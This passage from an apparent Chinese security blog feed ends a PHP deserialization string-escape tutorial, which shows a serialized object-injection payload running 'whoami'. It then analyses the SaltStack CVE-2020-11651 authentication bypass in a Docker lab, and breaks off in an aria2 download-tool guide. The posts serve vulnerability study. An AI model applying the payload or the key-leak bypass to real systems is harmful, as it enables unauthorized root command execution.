class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行上述payload观察序列化结果：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201013125731.png" alt="20201013125731"></p><p>db.txt文件中的内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1234"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ts"</span><span class="token punctuation">;</span><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"evil"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可看到<code>s:54</code>在反序列化之后正好覆盖了<code>&quot;;s:8:&quot;password&quot;;s:54:&quot;1234</code>这个27个字符，从而导致evil对象的注入。</p><p><strong>总结起来要达到字符串逃逸导致对象注入的要求有：</strong><br>1.相邻两个属性的值是我们可以控制的<br>2.前一个属性的s长度可以发生变化，变长变短都可以，变短的话可以吞掉后面相邻属性的值，然后在相邻属性中注入新的对象，如果边长则可以直接在该属性中注入对象来达到反序列化</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/6718">详解PHP反序列化中的字符逃逸</a><br><a href="https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/">php字符串逃逸导致的对象注入</a><br><a href="https://my.oschina.net/u/4264835/blog/3246584">PHP字符逃逸导致的对象注入</a><br><a href="https://yoga7xm.top/2019/11/30/joomla/">Joomla3.4.6 RCE漏洞分析</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-11651 SaltStack认证绕过分析</title>
      <link href="2020/08/11/saltstack-bypass-auth/"/>
      <url>2020/08/11/saltstack-bypass-auth/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SaltStack是一种基于C/S架构的服务器基础架构集中管理平台，它是一种全新的基础设施管理方式，部署轻松，在几分钟内可运行起来，扩展性好，很容易管理上万台服务器，速度够快，服务器之间秒级通讯。<br>Saltstack使用Python开发，是一个非常简单易用和轻量级的管理工具。由Master和Minion构成，通过ZeroMQ进行通信，master可以通过发布消息来管理多个minion。<br>Saltstack的master端监听4505与4506端口，4505为salt的消息发布系统，4506为salt客户端与服务端通信的端口；salt客户端程序不监听端口，客户端启动后，会主动连接master端注册，然后一直保持该TCP连接，master通过这条TCP连接对客户端控制，</p><p>2020年4月30日 F-Secure 安全团队披露了关于SaltStack两个安全漏洞：CVE-2020-11651 权限缺陷、CVE-2020-11652 任意文件读写漏洞。受影响的版本为：</p><ul><li>CVE-2020-11651 SaltStack Salt before 2019.2.4 and 3000 before 3000.2</li><li>CVE-2020-11652 SaltStack Salt before 2019.2.4 and 3000 before 3000.2</li></ul><p>本文来分析并复现下CVE-2020-11651这个漏洞。</p><h2 id="SaltStack安装"><a href="#SaltStack安装" class="headerlink" title="SaltStack安装"></a>SaltStack安装</h2><p>SaltStack有多种安装方式，<a href="https://docs.saltstack.cn/topics/installation/index.html#installation">这个是</a>官方的安装教程,涵盖了多个平台的安装。但是我推荐使用Salt bootstrap的快速安装方式，只需一个脚本即可完成安装，项目地址：<a href="https://github.com/saltstack/salt-bootstrap/tree/stable">https://github.com/saltstack/salt-bootstrap/tree/stable</a>.</p><p>由于本次只是为了漏洞的演示，所以使用docker快速安装。<br>使用以下命令即可完成安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker pull vulfocus/saltstack-cve_2020_11651docker run -d -p <span class="token number">4506</span>:4506 -p <span class="token number">4505</span>:4505 vulfocus/saltstack-cve_2020_11651<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其实VULFOCUS上也集成了这个靶场.</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200811111407.png" alt="20200811111407"></p><p>先试用exp进行下验证, 使用的exp是github上开源的一个,<a href="https://github.com/0xc0d/CVE-2020-11651">https://github.com/0xc0d/CVE-2020-11651</a>:</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200811150805.png" alt="20200811150805"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在漏洞分析之前需要先梳理下SaltStack的认证方式：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200824172454.png" alt="20200824172454"></p><p>上图为SaltStack Master和Monion的一个简单架构，Master负责管理众多Monion.</p><p>Salt master 与 minion 通讯采用的是”订阅-发布“的模式。<br>通讯的连接由 Salt minion 发起，这意味着 minion 无须开启进向的端口（注意：此方式极大地简便了网络规则的设定）。<br>而 Salt master 的 4505 和 4506 端口（默认）必须开启，以接收外部的连接。其中端口功能如下表所示。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200824174132.png" alt="20200824174132"></p><p>1.当 minion 启动时，其将搜索网络中的 master。当找到时， minion 将发送公钥给 Salt master，从而实现初次握手。<br>2.当初次握手后，Salt minion 的公钥将被保存在服务端，此时 master 需要使用过 salt-key 命令接收公钥（也可以采用自动机制）。注意：在 Salt minion 的公钥被接收前，Salt master 是不会将密钥发放给 minion 的，也就是说 minion 在此之前不会执行任何命令。<br>3.当 Salt minion 的公钥被接收后，Salt master 就会把公钥连同用于加解密 master 信息的可变动 AES 密钥发送至 Salt minion。其中，返回给 Salt minion 的 AES 密钥由 minion 的公钥加密，可由 Salt minion 解密。</p><p>当密钥交换完毕后，后续的通讯过程就可以使用AES进行加密。</p><p>本次漏洞发生的原因就出在了4506端口上，由于Master端的ClearFuncs类处理未经身份验证的请求，并且调用_send_pub（）方法，此方法可以获取root key从而导致可以以root权限执行任意命令。</p><p>看一下POC的核心语句：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200825105904.png" alt="20200825105904"></p><p>在看代码：/salt/transport/zeromq.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@salt<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>tornado<span class="token punctuation">.</span>gen<span class="token punctuation">.</span>coroutine</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> load<span class="token punctuation">,</span> tries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        Send a request, return a future which will complete when we send the message        '''</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>crypt <span class="token operator">==</span> <span class="token string">'clear'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token keyword">yield</span> self<span class="token punctuation">.</span>_uncrypted_transfer<span class="token punctuation">(</span>load<span class="token punctuation">,</span> tries<span class="token operator">=</span>tries<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token keyword">yield</span> self<span class="token punctuation">.</span>_crypted_transfer<span class="token punctuation">(</span>load<span class="token punctuation">,</span> tries<span class="token operator">=</span>tries<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span> raw<span class="token operator">=</span>raw<span class="token punctuation">)</span>        <span class="token keyword">raise</span> salt<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>tornado<span class="token punctuation">.</span>gen<span class="token punctuation">.</span>Return<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>salt.transport.client.ReqChannel.factory 最后被实例化为AsyncZeroMQReqChannel，而且带有clear参数，即发给master的命令是clear没有AES加密的.</p><p>salt-master普遍使用这两行代码进行认证，其中clear_load是可控输入点。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">auth_type<span class="token punctuation">,</span> err_name<span class="token punctuation">,</span> key<span class="token punctuation">,</span> sensitive_load_keys <span class="token operator">=</span> self<span class="token punctuation">.</span>_prep_auth_info<span class="token punctuation">(</span>clear_load<span class="token punctuation">)</span>auth_check <span class="token operator">=</span> self<span class="token punctuation">.</span>loadauth<span class="token punctuation">.</span>check_authentication<span class="token punctuation">(</span>clear_load<span class="token punctuation">,</span> auth_type<span class="token punctuation">,</span> key<span class="token operator">=</span>key<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>_prep_auth_info首先会识别clear_load输入的字段并选用其中之一作为认证方式，然后传参到check_authentication方法检验认证是否有效。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_prep_auth_info</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> clear_load<span class="token punctuation">)</span><span class="token punctuation">:</span>    sensitive_load_keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">if</span> <span class="token string">"token"</span> <span class="token keyword">in</span> clear_load<span class="token punctuation">:</span>        auth_type <span class="token operator">=</span> <span class="token string">"token"</span>        err_name <span class="token operator">=</span> <span class="token string">"TokenAuthenticationError"</span>        sensitive_load_keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span>    <span class="token keyword">elif</span> <span class="token string">"eauth"</span> <span class="token keyword">in</span> clear_load<span class="token punctuation">:</span>        auth_type <span class="token operator">=</span> <span class="token string">"eauth"</span>        err_name <span class="token operator">=</span> <span class="token string">"EauthAuthenticationError"</span>        sensitive_load_keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        auth_type <span class="token operator">=</span> <span class="token string">"user"</span>        err_name <span class="token operator">=</span> <span class="token string">"UserAuthenticationError"</span>        key <span class="token operator">=</span> self<span class="token punctuation">.</span>key    <span class="token keyword">return</span> auth_type<span class="token punctuation">,</span> err_name<span class="token punctuation">,</span> key<span class="token punctuation">,</span> sensitive_load_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在第三种认证方式auth_type==’user’中，会由_prep_auth_info获取到系统opt的key，传递到check_authentication中和API参数中携带的key进行==比对。</p><p>理论上_prep_auth_info是不可被外部调用的，漏洞成因即是攻击者通过匿名API直接调用_prep_auth_info方法，在回显中拿到self.key，并在后续的请求中使用获取到的key过验证，以root权限执行高危指令。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/7741">SaltStack CVE-2020-11651/11652 分析</a></li><li><a href="https://github.com/0xc0d/CVE-2020-11651">https://github.com/0xc0d/CVE-2020-11651</a></li><li><a href="https://www.secrss.com/articles/19214">SaltStack远程命令执行漏洞介绍及复现</a></li><li><a href="https://l0gs.xf0rk.space/2020/05/04/saltstack-rce-your-master-and-minions/">SaltStack，Shell Master 和 Minion 漏洞分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SaltStack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你还在忍受龟速下载吗?--mac上使用aria2的最佳实践</title>
      <link href="2020/07/29/aria2c-best-partice/"/>
      <url>2020/07/29/aria2c-best-partice/</url>
      
        <content type="html"><![CDATA[<blockquote><p>首发于freebuf：<a href="https://www.freebuf.com/sectool/244962.html">https://www.freebuf.com/sectool/244962.html</a></p></blockquote><h2 id="aria2简介"><a href="#aria2简介" class="headerlink" title="aria2简介"></a>aria2简介</h2><p>aria2是一个轻量级多协议和多源命令行下载实用程序。它支持HTTP/HTTPS、FTP、SFTP、BitTorrent和Metalink。aria2可以通过内置的JSON-RPC和XML-RPC接口进行操作。aria2支持多线程下载，在同等网络条件下，下载速度可以提升数倍。aria2是跨平台的，操作简单，并支持断点续传，本文重点介绍aria2在mac os下的使用。</p><h2 id="安装aria2"><a href="#安装aria2" class="headerlink" title="安装aria2"></a>安装aria2</h2><p>mac上安装aria2十分简单，你只需要在终端下输入命令<code>brew install aria2</code>即可安装。你也可以在<a href="https://github.com/aria2/aria2/releases/tag/release-1.35.0">这里</a>下载对应的安装包进行安装：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729145956.png" alt="20200729145956"></p><p>aria2安装完毕后在终端输入aria2c即可进行使用:</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200729150133.png" alt="20200729150133"></p><h2 id="aria2的配置文件"><a href="#aria2的配置文件" class="headerlink" title="aria2的配置文件"></a>aria2的配置文件</h2><p>aria2可通过配置文件进行灵活定义各项功能，aria2安装完毕后可在当前用户目录下新建一个<code>.aria2</code>文件夹，并在这个文件夹内新建一个<code>aria2.conf</code>文件，此文件即为aria2的配置文件，当aria2启动时会自动读取此文件中的配置。</p><blockquote><p>注意还需要在此文件夹下新建一个<code>aria2.session</code>的文件用于保存会话。</p></blockquote><p><code>aria2.conf</code>配置文件详解：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">## '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ##</span><span class="token comment">## 被注释的选项填写的是默认值, 建议在需要修改时再取消注释  ##</span><span class="token comment">## 文件保存相关 ##</span><span class="token comment"># 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置</span><span class="token assign-left variable">dir</span><span class="token operator">=</span>/home/ivo/Videos<span class="token comment"># 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span><span class="token comment">#disk-cache=32M</span><span class="token comment">#disk-cache=32M</span><span class="token comment"># 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span><span class="token comment"># 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span><span class="token comment"># falloc和trunc则需要文件系统和内核支持</span><span class="token comment"># NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项</span>file-allocation<span class="token operator">=</span>prealloc<span class="token comment"># 断点续传</span><span class="token assign-left variable">continue</span><span class="token operator">=</span>true<span class="token comment">## 下载连接相关 ##</span><span class="token comment"># 最大同时下载任务数, 运行时可修改, 默认:5</span>max-concurrent-downloads<span class="token operator">=</span><span class="token number">10</span><span class="token comment"># 同一服务器连接数, 添加时可指定, 默认:1</span>max-connection-per-server<span class="token operator">=</span><span class="token number">10</span><span class="token comment"># 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span><span class="token comment"># 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span>min-split-size<span class="token operator">=</span>10M<span class="token comment"># 单个任务最大线程数, 添加时可指定, 默认:5</span><span class="token assign-left variable">split</span><span class="token operator">=</span><span class="token number">5</span><span class="token comment"># 整体下载速度限制, 运行时可修改, 默认:0</span><span class="token comment">#max-overall-download-limit=0</span><span class="token comment"># 单个任务下载速度限制, 默认:0</span><span class="token comment">#max-download-limit=0</span><span class="token comment"># 整体上传速度限制, 运行时可修改, 默认:0</span><span class="token comment">#max-overall-upload-limit=0</span><span class="token comment"># 单个任务上传速度限制, 默认:0</span><span class="token comment">#max-upload-limit=0</span><span class="token comment"># 禁用IPv6, 默认:false</span>disable-ipv6<span class="token operator">=</span>true<span class="token comment">## 进度保存相关 ##</span><span class="token comment"># 从会话文件中读取下载任务</span>input-file<span class="token operator">=</span>/home/ivo/.aria2/aria2.session<span class="token comment"># 在Aria2退出时保存`错误/未完成`的下载任务到会话文件</span>save-session<span class="token operator">=</span>/home/ivo/.aria2/aria2.session<span class="token comment"># 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span>save-session-interval<span class="token operator">=</span><span class="token number">60</span><span class="token comment">## RPC相关设置 ##</span>enable-rpc<span class="token operator">=</span>true<span class="token assign-left variable">pause</span><span class="token operator">=</span>falserpc-allow-origin-all<span class="token operator">=</span>truerpc-listen-all<span class="token operator">=</span>truerpc-save-upload-metadata<span class="token operator">=</span>truerpc-secure<span class="token operator">=</span>false<span class="token comment"># 启用RPC, 默认:false</span><span class="token comment">#enable-rpc=true</span><span class="token comment"># 允许所有来源, 默认:false</span><span class="token comment">#rpc-allow-origin-all=true</span><span class="token comment"># 允许非外部访问, 默认:false</span><span class="token comment">#rpc-listen-all=true</span><span class="token comment"># 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span><span class="token comment">#event-poll=select</span><span class="token comment"># RPC监听端口, 端口被占用时可以修改, 默认:6800</span>rpc-listen-port<span class="token operator">=</span><span class="token number">6800</span><span class="token comment"># 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span><span class="token comment">#rpc-secure=&lt;taken></span><span class="token comment"># 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><span class="token comment">#rpc-user=&lt;USER></span><span class="token comment"># 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><span class="token comment">#rpc-passwd=&lt;PASSWD></span><span class="token comment">## BT/PT下载相关 ##</span><span class="token comment"># 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true</span><span class="token comment">#follow-torrent=true</span><span class="token comment"># BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span>listen-port<span class="token operator">=</span><span class="token number">51413</span><span class="token comment"># 单个种子最大连接数, 默认:55</span><span class="token comment">#bt-max-peers=55</span><span class="token comment"># 打开DHT功能, PT需要禁用, 默认:true</span>enable-dht<span class="token operator">=</span>true<span class="token comment"># 打开IPv6 DHT功能, PT需要禁用</span><span class="token comment">#enable-dht6=false</span><span class="token comment"># DHT网络监听端口, 默认:6881-6999</span><span class="token comment">#dht-listen-port=6881-6999</span><span class="token comment"># 本地节点查找, PT需要禁用, 默认:false</span>bt-enable-lpd<span class="token operator">=</span>true<span class="token comment"># 种子交换, PT需要禁用, 默认:true</span>enable-peer-exchange<span class="token operator">=</span>false<span class="token comment"># 每个种子限速, 对少种的PT很有用, 默认:50K</span><span class="token comment">#bt-request-peer-speed-limit=50K</span><span class="token comment"># 客户端伪装, PT需要</span><span class="token comment">#peer-id-prefix=-TR2770-</span>user-agent<span class="token operator">=</span>Transmission/2.92<span class="token comment">#user-agent=netdisk;4.4.0.6;PC;PC-Windows;6.2.9200;WindowsBaiduYunGuanJia</span><span class="token comment"># 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span>seed-ratio<span class="token operator">=</span><span class="token number">1.0</span><span class="token comment">#作种时间大于30分钟，则停止作种</span>seed-time<span class="token operator">=</span><span class="token number">30</span><span class="token comment"># 强制保存会话, 话即使任务已经完成, 默认:false</span><span class="token comment"># 较新的版本开启后会在任务完成后依然保留.aria2文件</span><span class="token comment">#force-save=false</span><span class="token comment"># BT校验相关, 默认:true</span><span class="token comment">#bt-hash-check-seed=true</span><span class="token comment"># 继续之前的BT任务时, 无需再次校验, 默认:false</span>bt-seed-unverified<span class="token operator">=</span>true<span class="token comment"># 保存磁力链接元数据为种子文件(.torrent文件), 默认:false</span>bt-save-metadata<span class="token operator">=</span>true<span class="token comment">#下载完成后删除.ara2的同名文件</span>on-download-complete<span class="token operator">=</span>/home/ivo/aria2/delete_aria2<span class="token comment">#on-download-complete=/home/pi/aria2/rasp.sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你不想自己去配置aria2，那么<a href="https://gist.github.com/maboloshi/a4b1f27567319d4a42352aadd036a578">这里</a>有一份现成的配置文件，拿来即可使用。</p><h2 id="aria2常用命令详解"><a href="#aria2常用命令详解" class="headerlink" title="aria2常用命令详解"></a>aria2常用命令详解</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Options: -v, --version                打印版本信息 -h, --help<span class="token punctuation">[</span><span class="token operator">=</span>TAG<span class="token operator">|</span>KEYWORD<span class="token punctuation">]</span>     显示帮助信息 -l, --log<span class="token operator">=</span>LOG                指定日志保存文件 -d, --dir<span class="token operator">=</span>DIR                指定文件下载位置 -o, --out<span class="token operator">=</span>FILE               指定文件下载后的保存时的文件名 -s, --split<span class="token operator">=</span>N                指定下载时的连接数，默认为5 --file-allocation<span class="token operator">=</span>METHOD     指定文件分配方式                              Possible Values: none, prealloc, trunc, falloc                              Default: prealloc -V, --check-integrity<span class="token punctuation">[</span><span class="token operator">=</span>true<span class="token operator">|</span>false<span class="token punctuation">]</span>    通过验证散列或整个文件的哈希来检查文件的完整性。此选项仅在BitTorrent，                                       带有校验和的Metalink下载或带有--checksum选 项的HTTP（S）/ FTP下载中有效。 -c, --continue<span class="token punctuation">[</span><span class="token operator">=</span>true<span class="token operator">|</span>false<span class="token punctuation">]</span>  是否开启断点续传 -i, --input-file<span class="token operator">=</span>FILE        从文件中读取url进行下载，每行一个url -j, --max-concurrent-downloads<span class="token operator">=</span>N    为每个队列项设置并行下载的最大数量，默认值为5 -Z, --force-sequential<span class="token punctuation">[</span><span class="token operator">=</span>true<span class="token operator">|</span>false<span class="token punctuation">]</span>  在命令行中依次获取URI并在单独的会话中下载每个URI -x, --max-connection-per-server<span class="token operator">=</span>NUM  每次下载与一台服务器的最大连接数，默认为1 -k, --min-split-size<span class="token operator">=</span>SIZE    指定文件可分隔大小，默认值为20M --ftp-user<span class="token operator">=</span><span class="token environment constant">USER</span>              指定ftp用户名 --ftp-passwd<span class="token operator">=</span>PASSWD          指定ftp密码 --http-user<span class="token operator">=</span><span class="token environment constant">USER</span>             指定http认证用户名 --http-passwd<span class="token operator">=</span>PASSWD         指定http认证密码 --load-cookies<span class="token operator">=</span>FILE          指定存放cookies的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>详细使用手册请查看：<a href="https://aria2.github.io/manual/en/html/aria2c.html#">https://aria2.github.io/manual/en/html/aria2c.html#</a></p><h2 id="下载示例"><a href="#下载示例" class="headerlink" title="下载示例"></a>下载示例</h2><h3 id="下载单个文件"><a href="#下载单个文件" class="headerlink" title="下载单个文件"></a>下载单个文件</h3><p>下面的命令将会从指定的 URL 中下载一个文件，并且保存在当前目录，在下载文件的过程中，我们可以看到文件的（日期、时间、下载速度和下载进度）。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><span class="token punctuation">[</span><span class="token comment">#986c80 19MiB/21MiB(90%) CN:1 DL:3.0MiB]</span>03/22 09:49:13 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/owncloud-9.0.0.tar.bz2Download Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>986c80<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">3</span>.0MiB/s<span class="token operator">|</span>/opt/owncloud-9.0.0.tar.bz2Status Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用不同的名字保存文件"><a href="#使用不同的名字保存文件" class="headerlink" title="使用不同的名字保存文件"></a>使用不同的名字保存文件</h3><p>在初始化下载的时候，我们可以使用 -o（小写）选项在保存文件的时候使用不同的名字。这儿我们将要使用 owncloud.zip 文件名来保存文件。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><span class="token punctuation">[</span><span class="token comment">#d31304 16MiB/21MiB(74%) CN:1 DL:6.2MiB]</span>03/22 09:51:02 <span class="token punctuation">[</span>NOTICE<span class="token punctuation">]</span> Download complete: /opt/owncloud.zipDownload Results:gid   <span class="token operator">|</span><span class="token function">stat</span><span class="token operator">|</span>avg speed  <span class="token operator">|</span>path/URI<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>d31304<span class="token operator">|</span>OK  <span class="token operator">|</span>   <span class="token number">7</span>.3MiB/s<span class="token operator">|</span>/opt/owncloud.zipStatus Legend:<span class="token punctuation">(</span>OK<span class="token punctuation">)</span>:download completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="下载速度限制"><a href="#下载速度限制" class="headerlink" title="下载速度限制"></a>下载速度限制</h3><p>默认情况下，aria2 